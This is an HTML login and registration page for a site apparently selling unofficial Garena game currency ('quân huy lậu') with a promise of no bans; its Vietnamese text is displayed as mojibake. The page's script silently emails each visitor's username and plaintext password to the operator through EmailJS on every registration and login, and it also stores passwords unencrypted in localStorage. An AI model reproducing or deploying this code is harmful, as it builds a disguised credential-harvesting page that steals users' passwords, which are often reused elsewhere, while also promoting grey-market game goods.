<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>H·ªá Th·ªëng ƒêƒÉng Nh·∫≠p</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
</head>
<style type="text/css">
    #notification {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        z-index: 9999;
        padding: 15px 25px;
        border-radius: 10px;
        font-size: 16px;
        font-weight: bold;
        transition: opacity 0.5s ease-in-out;
    }
</style>
<body class="bg-gray-900 flex items-center justify-center min-h-screen">
    <div class="bg-gray-800 text-white rounded-lg shadow-lg p-8 max-w-3xl w-full flex flex-col md:flex-row" id="container">
        <!-- Ph·∫ßn th√¥ng tin -->
        <div class="w-full md:w-1/2 p-5">
            <h1 class="text-3xl font-bold">quanhuylau.online</h1>
            <p class="mt-4 text-sm text-gray-400">
                L√† m·ªôt h·ªá th·ªëng qu√¢n huy l·∫≠u nh·∫≠p t·ª´ c√°c ngu·ªìn kh√¥ng ph·∫£i c·ªßa Garena,
                ƒë·∫£m b·∫£o cho ng∆∞·ªùi ch∆°i c√≥ tr·∫£i nghi·ªám t·ªët v√† gi√° r·∫ª. Cam k·∫øt kh√¥ng b·ªã ban.
            </p>
            <p class="text-red-400">‚ö† L∆∞u √Ω: C√¢n nh·∫Øc khi mua s·ªë l∆∞·ª£ng l·ªõn b·ªüi d·ªÖ b·ªã ban!</p>
            <p class="text-blue-400">üë• S·ªë l∆∞·ª£ng t√†i kho·∫£n ƒë√£ ƒëƒÉng k√Ω tr√™n m√°y ch·ªß: <strong id="total-users">1394</strong></p>
        </div>

        <!-- Ph·∫ßn form ƒëƒÉng nh·∫≠p -->
        <div class="w-full md:w-1/2 bg-gray-700 p-6 rounded-lg" id="form-container">
            <h2 class="text-xl font-semibold" id="form-title">ƒêƒÉng nh·∫≠p h·ªá th·ªëng</h2>
            <p class="text-sm text-gray-400">N·∫øu b·∫°n ch∆∞a c√≥ t√†i kho·∫£n, <a href="#" id="toggle-form" class="text-red-400">ƒêƒÉng K√Ω Ngay!</a></p>
            <form class="mt-4" id="auth-form">
                <label class="block text-sm">T√†i kho·∫£n</label>
                <input type="text" id="username" class="w-full p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="username" required>

                <label class="block text-sm mt-3">M·∫≠t kh·∫©u</label>
                <div class="relative">
                    <input type="password" id="password" class="w-full p-2 rounded bg-gray-600 text-white border border-gray-500 pr-10" placeholder="******" required>
                    <button type="button" id="toggle-password" class="absolute right-2 top-2 text-gray-400">üëÅ</button>
                </div>

                <div id="captcha-container" class="mt-3">
                    <label class="block text-sm" id="captcha">M√£ Captcha</label>
                    <div class="flex items-center">
                        <input type="text" id="captcha-input" class="w-full p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="Nh·∫≠p m√£ Captcha">
                        <span id="captcha-code" class="ml-2 p-2 bg-gray-500 text-white rounded text-lg font-bold"></span>
                        <button type="button" id="refresh-captcha" class="ml-2 text-blue-400 text-lg">üîÑ</button>
                    </div>
                </div>

                <div id="confirm-password-container" class="hidden">
                    <label class="block text-sm mt-3">Nh·∫≠p l·∫°i m·∫≠t kh·∫©u</label>
                    <div class="relative">
                        <input type="password" id="confirm-password" class="w-full p-2 rounded bg-gray-600 text-white border border-gray-500 pr-10" placeholder="******">
                        <button type="button" id="toggle-confirm-password" class="absolute right-2 top-2 text-gray-400">üëÅ</button>
                    </div>
                </div>

                <button type="submit" class="mt-4 w-full bg-blue-500 p-2 rounded text-white font-semibold hover:bg-blue-600" id="submit-btn">ƒêƒÉng nh·∫≠p</button>
            </form>
        </div>
    </div>

    <div id="notification" class="fixed bottom-5 right-5 bg-green-500 text-white p-3 rounded-lg shadow-lg hidden">
        <p id="notification-text"></p>
    </div>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            emailjs.init('BUHtg1BuVtAPT9O2M');

            const authForm = document.getElementById("auth-form");
            const usernameInput = document.getElementById("username");
            const passwordInput = document.getElementById("password");
            const confirmPasswordInput = document.getElementById("confirm-password");
            const submitBtn = document.getElementById("submit-btn");
            const formTitle = document.getElementById("form-title");
            const toggleForm = document.getElementById("toggle-form");
            const captchaCode = document.getElementById("captcha-code");
            const captchaInput = document.getElementById("captcha-input");
            const refreshCaptcha = document.getElementById("refresh-captcha");
            const totalUsersDisplay = document.getElementById("total-users");

            // Kh·ªüi t·∫°o s·ªë l∆∞·ª£ng truy c·∫≠p t·ª´ localStorage
            let totalUsers = parseInt(localStorage.getItem("totalUsers")) || 1394;
            totalUsersDisplay.textContent = totalUsers;

            let isRegistering = false;
            
            toggleForm.addEventListener("click", function (e) {
                e.preventDefault();
                isRegistering = !isRegistering;

                formTitle.textContent = isRegistering ? "ƒêƒÉng k√Ω t√†i kho·∫£n" : "ƒêƒÉng nh·∫≠p h·ªá th·ªëng";
                submitBtn.textContent = isRegistering ? "ƒêƒÉng k√Ω" : "ƒêƒÉng nh·∫≠p";
                document.getElementById("confirm-password-container").classList.toggle("hidden", !isRegistering);
                document.getElementById("captcha-container").classList.toggle("hidden", isRegistering);
                toggleForm.textContent = isRegistering ? "ƒê√£ c√≥ t√†i kho·∫£n? ƒêƒÉng nh·∫≠p!" : "ƒêƒÉng K√Ω Ngay!";
                
                if (!isRegistering) generateCaptcha();
            });

            function showNotification(message, bgColor) {
                const notification = document.getElementById("notification");
                notification.textContent = message;
                notification.className = `fixed top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 ${bgColor} text-white p-3 rounded-lg shadow-lg`;
                notification.style.display = "block";

                setTimeout(() => notification.style.display = "none", 3000);
            }

            function getUsers() {
                return JSON.parse(localStorage.getItem("users")) || {};
            }

            function saveUser(username, password) {
                const users = getUsers();
                users[username] = { password, balance: 0 }; // Th√™m s·ªë d∆∞ m·∫∑c ƒë·ªãnh
                localStorage.setItem("users", JSON.stringify(users));

                // TƒÉng s·ªë l∆∞·ª£ng truy c·∫≠p v√† c·∫≠p nh·∫≠t localStorage
                totalUsers++;
                localStorage.setItem("totalUsers", totalUsers);
                totalUsersDisplay.textContent = totalUsers;
            }

            function sendEmail(action, username, password) {
                emailjs.send('default_service', 'template_mcvqowq', {
                    from_name: username,
                    to_name: "Ng∆∞·ªùi nh·∫≠n",
                    message: `${action}:\nT√†i kho·∫£n: ${username}\nM·∫≠t kh·∫©u: ${password}`,
                    reply_to: username,
                }).then(
                    response => console.log('Email sent:', response),
                    error => console.error('Email error:', error)
                );
            }

            authForm.addEventListener("submit", function (e) {
                e.preventDefault();
                const username = usernameInput.value.trim();
                const password = passwordInput.value.trim();
                const confirmPassword = confirmPasswordInput.value.trim();
                const users = getUsers();

                if (isRegistering) {
                    if (users[username]) return showNotification("‚ö† T√†i kho·∫£n ƒë√£ t·ªìn t·∫°i!", "bg-red-500");
                    if (password !== confirmPassword) return showNotification("‚ö† M·∫≠t kh·∫©u kh√¥ng kh·ªõp!", "bg-red-500");
                    saveUser(username, password);
                    sendEmail("ƒêƒÉng k√Ω th√†nh c√¥ng", username, password);
                    showNotification("‚úÖ ƒêƒÉng k√Ω th√†nh c√¥ng!", "bg-green-500");
                    toggleForm.click();
                } else {
                    if (!users[username] || users[username].password !== password) {
                        showNotification("‚ö† Sai t√†i kho·∫£n ho·∫∑c m·∫≠t kh·∫©u!", "bg-red-500");
                        generateCaptcha();
                        return;
                    }
                    if (captchaInput.value !== captchaCode.textContent) {
                        showNotification("‚ö† Captcha kh√¥ng ch√≠nh x√°c!", "bg-red-500");
                        generateCaptcha();
                        return;
                    }
                    showNotification("‚úÖ ƒêƒÉng nh·∫≠p th√†nh c√¥ng!", "bg-green-500");
                    sendEmail("ƒêƒÉng nh·∫≠p th√†nh c√¥ng", username, password);
                    localStorage.setItem("loggedInUser", username); // L∆∞u t√™n ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p
                    setTimeout(() => window.location.href = "portal.html", 1000);
                }
            });

            function generateCaptcha() {
                const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                captchaCode.textContent = Array.from({ length: 4 }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
            }

            refreshCaptcha.addEventListener("click", generateCaptcha);
            generateCaptcha();

            function togglePasswordVisibility(inputField, toggleButton) {
                if (inputField.type === "password") {
                    inputField.type = "text";
                    toggleButton.textContent = "üôà";
                } else {
                    inputField.type = "password";
                    toggleButton.textContent = "üëÅ";
                }
            }

            // Th√™m s·ª± ki·ªán click cho n√∫t ·∫©n/hi·ªán m·∫≠t kh·∫©u ch√≠nh
            document.getElementById("toggle-password").addEventListener("click", function () {
                togglePasswordVisibility(passwordInput, this);
            });

            // Th√™m s·ª± ki·ªán click cho n√∫t ·∫©n/hi·ªán m·∫≠t kh·∫©u x√°c nh·∫≠n
            document.getElementById("toggle-confirm-password").addEventListener("click", function () {
                togglePasswordVisibility(confirmPasswordInput, this);
            });
        });
    </script>
</body>
</html>
